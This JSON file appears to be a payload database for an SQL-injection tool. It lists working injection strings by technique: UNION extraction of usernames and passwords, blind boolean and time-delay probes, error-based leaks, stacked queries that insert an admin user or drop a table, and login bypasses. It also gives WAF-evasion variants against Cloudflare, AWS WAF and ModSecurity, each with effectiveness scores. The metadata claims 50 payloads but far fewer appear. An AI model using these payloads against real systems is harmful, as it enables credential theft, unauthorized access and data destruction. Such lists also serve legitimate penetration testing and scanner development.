{
  "metadata": {
    "version": "1.0",
    "created": "2024-01-01T00:00:00Z",
    "last_updated": "2024-01-01T00:00:00Z",
    "total_payloads": 50
  },
  "categories": {
    "union_based": {
      "name": "Union-based SQL Injection",
      "description": "Payloads that use UNION queries to extract data",
      "payloads": [
        {
          "id": "union_001",
          "payload": "' UNION SELECT 1,2,3--",
          "description": "Basic UNION injection with 3 columns",
          "effectiveness": 0.8,
          "complexity": "low",
          "database_types": ["mysql", "postgresql", "mssql"],
          "tags": ["union", "basic", "enumeration"]
        },
        {
          "id": "union_002",
          "payload": "' UNION SELECT NULL,username,password FROM users--",
          "description": "Extract usernames and passwords",
          "effectiveness": 0.9,
          "complexity": "medium",
          "database_types": ["mysql", "postgresql"],
          "tags": ["union", "data_extraction", "credentials"]
        },
        {
          "id": "union_003",
          "payload": "' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables--",
          "description": "Enumerate database tables",
          "effectiveness": 0.85,
          "complexity": "medium",
          "database_types": ["mysql"],
          "tags": ["union", "enumeration", "information_schema"]
        }
      ]
    },
    "boolean_blind": {
      "name": "Boolean-based Blind SQL Injection",
      "description": "Payloads that exploit boolean-based blind SQL injection",
      "payloads": [
        {
          "id": "bool_001",
          "payload": "' AND '1'='1",
          "description": "Basic true condition test",
          "effectiveness": 0.7,
          "complexity": "low",
          "database_types": ["mysql", "postgresql", "mssql", "oracle"],
          "tags": ["boolean", "blind", "basic"]
        },
        {
          "id": "bool_002",
          "payload": "' AND (SELECT COUNT(*) FROM users)>0--",
          "description": "Test for users table existence",
          "effectiveness": 0.75,
          "complexity": "medium",
          "database_types": ["mysql", "postgresql", "mssql"],
          "tags": ["boolean", "blind", "enumeration"]
        },
        {
          "id": "bool_003",
          "payload": "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",
          "description": "Extract first character of username",
          "effectiveness": 0.8,
          "complexity": "high",
          "database_types": ["mysql", "postgresql"],
          "tags": ["boolean", "blind", "data_extraction"]
        }
      ]
    },
    "time_based": {
      "name": "Time-based Blind SQL Injection",
      "description": "Payloads that use time delays to confirm injection",
      "payloads": [
        {
          "id": "time_001",
          "payload": "'; WAITFOR DELAY '00:00:05'--",
          "description": "5-second delay on MSSQL",
          "effectiveness": 0.9,
          "complexity": "low",
          "database_types": ["mssql"],
          "tags": ["time_based", "blind", "mssql"]
        },
        {
          "id": "time_002",
          "payload": "'; SELECT SLEEP(5)--",
          "description": "5-second delay on MySQL",
          "effectiveness": 0.9,
          "complexity": "low",
          "database_types": ["mysql"],
          "tags": ["time_based", "blind", "mysql"]
        },
        {
          "id": "time_003",
          "payload": "'; SELECT pg_sleep(5)--",
          "description": "5-second delay on PostgreSQL",
          "effectiveness": 0.9,
          "complexity": "low",
          "database_types": ["postgresql"],
          "tags": ["time_based", "blind", "postgresql"]
        }
      ]
    },
    "error_based": {
      "name": "Error-based SQL Injection",
      "description": "Payloads that trigger database errors to extract information",
      "payloads": [
        {
          "id": "error_001",
          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
          "description": "Extract MySQL version through error",
          "effectiveness": 0.8,
          "complexity": "high",
          "database_types": ["mysql"],
          "tags": ["error_based", "version", "mysql"]
        },
        {
          "id": "error_002",
          "payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--",
          "description": "Extract current user through EXTRACTVALUE error",
          "effectiveness": 0.85,
          "complexity": "medium",
          "database_types": ["mysql"],
          "tags": ["error_based", "user", "mysql"]
        }
      ]
    },
    "stacked_queries": {
      "name": "Stacked Queries",
      "description": "Payloads that execute multiple SQL statements",
      "payloads": [
        {
          "id": "stack_001",
          "payload": "'; INSERT INTO users (username, password) VALUES ('admin2', 'password')--",
          "description": "Insert new admin user",
          "effectiveness": 0.7,
          "complexity": "high",
          "database_types": ["mssql", "postgresql"],
          "tags": ["stacked", "insert", "privilege_escalation"]
        },
        {
          "id": "stack_002",
          "payload": "'; DROP TABLE temp_table--",
          "description": "Drop temporary table",
          "effectiveness": 0.6,
          "complexity": "medium",
          "database_types": ["mssql", "postgresql", "mysql"],
          "tags": ["stacked", "drop", "destructive"]
        }
      ]
    },
    "authentication_bypass": {
      "name": "Authentication Bypass",
      "description": "Payloads designed to bypass authentication mechanisms",
      "payloads": [
        {
          "id": "auth_001",
          "payload": "admin'--",
          "description": "Comment out password check",
          "effectiveness": 0.6,
          "complexity": "low",
          "database_types": ["mysql", "postgresql", "mssql"],
          "tags": ["authentication", "bypass", "comment"]
        },
        {
          "id": "auth_002",
          "payload": "' OR '1'='1'--",
          "description": "Always true condition",
          "effectiveness": 0.8,
          "complexity": "low",
          "database_types": ["mysql", "postgresql", "mssql", "oracle"],
          "tags": ["authentication", "bypass", "boolean"]
        },
        {
          "id": "auth_003",
          "payload": "admin'/*",
          "description": "Comment out rest of query",
          "effectiveness": 0.5,
          "complexity": "low",
          "database_types": ["mysql", "mssql"],
          "tags": ["authentication", "bypass", "comment"]
        }
      ]
    }
  },
  "waf_bypass_payloads": {
    "cloudflare": [
      {
        "id": "cf_001",
        "payload": "' /**/UNION/**/SELECT/**/1,2,3--",
        "description": "Bypass Cloudflare with comments",
        "effectiveness": 0.6
      },
      {
        "id": "cf_002",
        "payload": "' %55NION %53ELECT 1,2,3--",
        "description": "Bypass Cloudflare with URL encoding",
        "effectiveness": 0.7
      }
    ],
    "aws_waf": [
      {
        "id": "aws_001",
        "payload": "' UnIoN SeLeCt 1,2,3--",
        "description": "Bypass AWS WAF with case variation",
        "effectiveness": 0.6
      }
    ],
    "modsecurity": [
      {
        "id": "mod_001",
        "payload": "' UNION SELECT CHAR(49),CHAR(50),CHAR(51)--",
        "description": "Bypass ModSecurity with CHAR encoding",
        "effectiveness": 0.8
      }
    ]
  },
  "effectiveness_matrix": {
    "by_database": {
      "mysql": {
        "union_based": 0.85,
        "boolean_blind": 0.8,
        "time_based": 0.9,
        "error_based": 0.8,
        "stacked_queries": 0.6
      },
      "postgresql": {
        "union_based": 0.8,
        "boolean_blind": 0.75,
        "time_based": 0.9,
        "error_based": 0.7,
        "stacked_queries": 0.8
      },
      "mssql": {
        "union_based": 0.8,
        "boolean_blind": 0.75,
        "time_based": 0.9,
        "error_based": 0.75,
        "stacked_queries": 0.85
      },
      "oracle": {
        "union_based": 0.7,
        "boolean_blind": 0.7,
        "time_based": 0.8,
        "error_based": 0.6,
        "stacked_queries": 0.5
      }
    },
    "by_waf": {
      "cloudflare": {
        "detection_rate": 0.8,
        "bypass_difficulty": "high"
      },
      "aws_waf": {
        "detection_rate": 0.75,
        "bypass_difficulty": "medium"
      },
      "modsecurity": {
        "detection_rate": 0.7,
        "bypass_difficulty": "medium"
      }
    }
  }
}
